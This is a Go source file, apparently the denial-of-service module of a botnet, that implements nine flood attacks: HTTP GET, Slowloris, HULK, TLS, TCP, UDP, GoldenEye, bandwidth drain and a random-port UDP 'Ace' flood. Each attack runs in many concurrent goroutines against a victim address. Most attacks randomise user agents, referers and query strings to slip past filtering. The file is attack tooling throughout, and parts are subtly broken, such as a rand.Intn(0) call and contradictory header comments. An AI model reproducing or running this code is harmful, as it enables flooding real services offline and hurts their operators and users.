//setDDoSMode(true) = stop attacks
//setDDoSMode(false) = stop attacks

package components

import (
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

func ddosAttc(attc string, vic string, threads int, interval int) { //HTTPGetAttack; DDoSAttc("0","http://example.com",100)
	if attc == "0" { //HTTPGet
		if strings.Contains(vic, "http://") {
			setDDoSMode(true)
			for i := 0; i < threads; i++ {
				go httpGetAttack(vic, interval)
			}
		}
	} else if attc == "1" { //Slowloris
		if strings.Contains(vic, "http://") {
			setDDoSMode(true)
			for i := 0; i < threads; i++ {
				go slowlorisAttack(vic, interval)
			}
		}
	} else if attc == "2" { //HULK
		if strings.Contains(vic, "http://") {
			setDDoSMode(true)
			u, _ := url.Parse(vic)
			for i := 0; i < threads; i++ {
				go hulkAttack(vic, u.Host, interval)
			}
		}
	} else if attc == "3" { //TLS Flood
		if strings.Contains(vic, ":") {
			setDDoSMode(true)
			for i := 0; i < threads; i++ {
				go tlsAttack(vic, interval)
			}
		}
	} else if attc == "4" { //UDP Flood
		if strings.Contains(vic, ":") {
			setDDoSMode(true)
			for i := 0; i < threads; i++ {
				go udpAttack(vic, interval)
			}
		}
	} else if attc == "5" { //TCP Flood
		if strings.Contains(vic, ":") {
			setDDoSMode(true)
			for i := 0; i < threads; i++ {
				go tcpAttack(vic, interval)
			}
		}

	} else if attc == "6" { //GoldenEye
		if strings.Contains(vic, "http://") {
			setDDoSMode(true)
			for i := 0; i < threads; i++ {
				go goldenEyeAttack(vic, interval)
			}
		}
	} else if attc == "7" { //Bandwidth Drain
		if strings.Contains(vic, "http://") {
			setDDoSMode(true)
			for i := 0; i < threads; i++ {
				go bandwidthDrainAttack(vic, interval)
			}
		}
	} else if attc == "8" { //Ace
		if strings.Contains(vic, ".") {
			setDDoSMode(true)
			for i := 0; i < threads; i++ {
				go aceAttack(vic, interval)
			}
		}
	}
}

func httpGetAttack(Target string, interval int) {
	for isDDoS {
		resp, _ := http.Get(Target)
		closeConnction(resp)
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func closeConnction(resp *http.Response) {
	if resp != nil {
		io.Copy(ioutil.Discard, resp.Body)
		resp.Body.Close()
	}
}

func slowlorisAttack(vic string, interval int) {
	client := &http.Client{}
	for isDDoS {
		rand.Seed(time.Now().UTC().UnixNano())
		req, _ := http.NewRequest("GET", vic+randomString(5, true), nil)
		req.Header.Add("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		req.Header.Add("Content-Length", "42")
		resp, _ := client.Do(req)
		defer resp.Body.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func hulkAttack(url string, host string, interval int) {
	var param_joiner string
	var client = new(http.Client)
	var acceptCharset string = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

	if strings.ContainsRune(url, '?') {
		param_joiner = "&"
	} else {
		param_joiner = "?"
	}
	for isDDoS {
		rand.Seed(time.Now().UTC().UnixNano())
		q, _ := http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		q.Header.Set("Cache-Control", "no-cache")
		q.Header.Set("Accept-Charset", acceptCharset)
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(110)+120))
		q.Header.Set("Connection", "keep-alive")
		q.Header.Set("Host", host)
		r, _ := client.Do(q)
		r.Body.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		rand.Seed(time.Now().UTC().UnixNano())
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}

func tlsAttack(vic string, interval int) {
	config := &tls.Config{
		InsecureSkipVerify: true,
	}
	dialer := &net.Dialer{}
	for isDDoS {
		c, _ := tls.DialWithDialer(dialer, "tcp", vic, config)
		c.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}
func tcpAttack(vic string, interval int) {
	conn, _ := net.Dial("tcp", vic)
	for isDDoS {
		rand.Seed(time.Now().UTC().UnixNano())
		fmt.Fprintf(conn, randomString(rand.Intn(0)+256, true))
		conn.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func udpAttack(vic string, interval int) {
	conn, _ := net.Dial("udp", vic)
	for isDDoS {
		rand.Seed(time.Now().UTC().UnixNano())
		fmt.Fprintf(conn, randomString(rand.Intn(0)+256, true))
		conn.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func aceAttack(vic string, interval int) {
	for isDDoS {
		rand.Seed(time.Now().UTC().UnixNano())
		conn, _ := net.Dial("udp", vic+":"+strconv.Itoa(rand.Intn(80)+9999))
		fmt.Fprintf(conn, randomString(rand.Intn(256)+1600, true))
		conn.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func bandwidthDrainAttack(file string, interval int) {
	for isDDoS {
		response, _ := http.Get(file)
		defer response.Body.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func goldenEyeAttack(vic string, interval int) {
	var client = new(http.Client)
	for isDDoS {
		rand.Seed(time.Now().UTC().UnixNano())
		q, _ := http.NewRequest("GET", vic, nil)
		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		q.Header.Set("Cache-Control", "no-cache")
		q.Header.Set("Accept-Encoding", `*,identity,gzip,deflate`)
		q.Header.Set("Accept-Charset", `ISO-8859-1, utf-8, Windows-1251, ISO-8859-2, ISO-8859-15`)
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(1000)+20000))
		q.Header.Set("Connection", "keep-alive")
		q.Header.Set("Content-Type", `multipart/form-data, application/x-url-encoded`)
		q.Header.Set("Cookies", randomString(rand.Intn(5)+25, false))
		r, _ := client.Do(q)
		r.Body.Close()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}
